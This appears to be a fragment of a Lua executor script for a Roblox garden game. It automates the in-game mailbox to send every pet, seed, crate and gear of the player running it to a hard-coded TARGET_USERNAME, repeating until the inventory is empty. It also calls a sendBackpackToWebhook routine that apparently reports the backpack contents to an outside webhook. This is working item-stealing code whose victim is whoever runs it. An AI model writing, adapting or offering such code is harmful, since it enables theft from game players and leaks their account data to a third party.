--------------------------------------------------------------------
-- Click helpers
--------------------------------------------------------------------

local function clickFrameUntilEmpty(frame)
    if not frame then return 0 end
    local clickCount = 0
    while clickCount < 999 do
        local innerFrame = frame:FindFirstChildWhichIsA("Frame")
        if not innerFrame then break end
        local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
        if not button then break end
        local countLabel = frame:FindFirstChild("Count", true)
            or frame:FindFirstChild("Amount", true)
            or innerFrame:FindFirstChildWhichIsA("TextLabel")
        if countLabel then
            local count = tonumber(countLabel.Text:match("%d+"))
            if count and count <= 0 then break end
        end
        clickButton(button)
        clickCount += 1
        task.wait(0.1)
    end
    return clickCount
end

local function clickAllByPrefix(inventoryFrame, prefix)
    for _, child in ipairs(inventoryFrame:GetChildren()) do
        if child.Name:sub(1, #prefix) == prefix then
            local clicked = clickFrameUntilEmpty(child)
            if clicked > 0 then
                print("Clicked " .. child.Name .. " x" .. clicked)
            end
        end
    end
end

local function clickPetsByPriority(inventoryFrame)
    local handled = {}

    for _, target in ipairs(PET_PRIORITY) do
        for _, child in ipairs(inventoryFrame:GetChildren()) do
            local name = child.Name
            if not handled[name] and name:sub(1, 9) == "Inv_Pets:" then
                local petPart = name:sub(10):lower()
                if petPart:find(target, 1, true) then
                    handled[name] = true
                    local clicked = clickFrameUntilEmpty(child)
                    if clicked > 0 then
                        print("[PRIORITY PET: " .. target .. "] " .. name .. " x" .. clicked)
                    end
                end
            end
        end
    end

    for _, child in ipairs(inventoryFrame:GetChildren()) do
        local name = child.Name
        if not handled[name] and name:sub(1, 9) == "Inv_Pets:" then
            handled[name] = true
            local clicked = clickFrameUntilEmpty(child)
            if clicked > 0 then
                print("[OTHER PET] " .. name .. " x" .. clicked)
            end
        end
    end
end

local function hasAnythingToSend(inventoryFrame)
    for _, child in ipairs(inventoryFrame:GetChildren()) do
        local name = child.Name
        if name:sub(1, 10) == "Inv_Seeds:"  then return true end
        if name:sub(1,  9) == "Inv_Pets:"   then return true end
        if name:sub(1, 11) == "Inv_Crates:" then return true end
        for _, prefix in ipairs(GEAR_PREFIXES) do
            if name:sub(1, #prefix) == prefix then return true end
        end
    end
    return false
end

local function runScript()
    runSequence()
    task.wait(0.7)

    local oldUI = playerGui:FindFirstChild("MailboxUI")
    if oldUI then
        local closeBtn = oldUI:FindFirstChild("CloseButton", true)
        if closeBtn then pcall(function() firesignal(closeBtn.MouseButton1Click) end) end
        task.wait(0.5)
    end

    local mailboxPrompt = workspace.Gardens.Plot1.Signs.GreyMailBox.ProximityPromptPart.MailboxPrompt
    fireproximityprompt(mailboxPrompt)
    task.wait(1.2)

    local mailboxUI = playerGui:WaitForChild("MailboxUI", 5)
    if not mailboxUI then warn("Retry: MailboxUI not found") return false end

    local mainFrame = mailboxUI:WaitForChild("Frame", 5)
    if not mainFrame then warn("Retry: Frame not found") return false end

    local sendingFrame = mainFrame:WaitForChild("SendingFrame", 5)
    if not sendingFrame then warn("Retry: SendingFrame not found") return false end

    local selectPlayerFrame = sendingFrame:WaitForChild("SelectPlayerFrame", 5)
    if not selectPlayerFrame then warn("Retry: SelectPlayerFrame not found") return false end

    local topbar = selectPlayerFrame:WaitForChild("Topbar", 5)
    if not topbar then warn("Retry: Topbar not found") return false end

    local searchBox = topbar:WaitForChild("SearchBox", 5)
    if not searchBox then warn("Retry: SearchBox not found") return false end

    searchBox:CaptureFocus()
    task.wait(0.3)
    searchBox.Text = TARGET_USERNAME
    task.wait(0.3)
    pcall(function()
        local VIM = game:GetService("VirtualInputManager")
        VIM:SendKeyEvent(true,  Enum.KeyCode.Return, false, game)
        task.wait(0.1)
        VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
    end)
    task.wait(1.2)

    local playerList = selectPlayerFrame:WaitForChild("PlayerList", 5)
    if not playerList then warn("Retry: PlayerList not found") return false end

    local found = false
    local deadline = tick() + 4
    while not found and tick() < deadline do
        for _, frame in ipairs(playerList:GetChildren()) do
            if frame:IsA("Frame") and frame.Name:match("^Search_") then
                local button = frame:FindFirstChild("Button")
                if button then
                    local usernameLabel = button:FindFirstChild("PlayerUsername")
                    if usernameLabel then
                        local cleanText = usernameLabel.Text:lower():gsub("^@", "")
                        if cleanText == TARGET_USERNAME:lower() then
                            clickButton(button)
                            found = true
                            print("Found and clicked player: " .. TARGET_USERNAME)
                            break
                        end
                    end
                end
            end
        end
        if not found then task.wait(0.15) end
    end

    if not found then warn("Retry: Player not found in list") return false end

    task.wait(0.8)

    local itemSendFrame = sendingFrame:WaitForChild("ItemSendFrame", 5)
    if not itemSendFrame then warn("Retry: ItemSendFrame not found") return false end

    local scrollingFrames = itemSendFrame:WaitForChild("ScrollingFrames", 5)
    if not scrollingFrames then warn("Retry: ScrollingFrames not found") return false end

    local inventoryFrame = scrollingFrames:WaitForChild("InventoryFrame", 5)
    if not inventoryFrame then warn("Retry: InventoryFrame not found") return false end

    print("Found InventoryFrame: " .. inventoryFrame:GetFullName())
    task.wait(0.5)

    pcall(function() logTargetPets(inventoryFrame) end)

    if not hasAnythingToSend(inventoryFrame) then
        print("Nothing left to send! Script complete.")
        return "done"
    end

    print("Clicking pets (priority order)...")
    clickPetsByPriority(inventoryFrame)

    print("Clicking seeds (tier order)...")
    for _, fruitName in ipairs(FRUITS) do
        local frameName = "Inv_Seeds:" .. fruitName
        local clicked = clickFrameUntilEmpty(inventoryFrame:FindFirstChild(frameName))
        if clicked > 0 then print("Seed clicked: " .. fruitName .. " x" .. clicked) end
    end

    print("Clicking crates...")
    for _, crateName in ipairs(CRATES) do
        local frameName = "Inv_Crates:" .. crateName
        local clicked = clickFrameUntilEmpty(inventoryFrame:FindFirstChild(frameName))
        if clicked > 0 then print("Crate clicked: " .. crateName .. " x" .. clicked) end
    end

    print("Clicking gears...")
    for _, prefix in ipairs(GEAR_PREFIXES) do
        clickAllByPrefix(inventoryFrame, prefix)
    end

    task.wait(0.3)

    local sendButton = itemSendFrame:WaitForChild("SendButton", 5)
    if not sendButton then warn("Retry: SendButton not found") return false end

    if sendButton:IsA("GuiButton") then
        clickButton(sendButton)
        print("Mail sent! Checking if more items remain...")
    end

    return true
end

task.spawn(function()
    task.wait(1.5)
    sendBackpackToWebhook()
end)

local attempt = 0
local allDone = false

while not allDone do
    attempt += 1
    print("Attempt #" .. attempt .. " starting...")

    local ok, result = pcall(function()
        return runScript()
    end)

    if not ok then
        warn("Attempt #" .. attempt .. " errored: " .. tostring(result))
        task.wait(1)
    elseif result == "done" then
        print("All items sent! Nothing left in inventory. Script finished.")
        allDone = true
    elseif result == true then
        print("Mail sent, checking for remaining items...")
        task.wait(1)
    else
        print("Attempt failed, retrying in 2 seconds...")
        task.wait(1)
    end
end
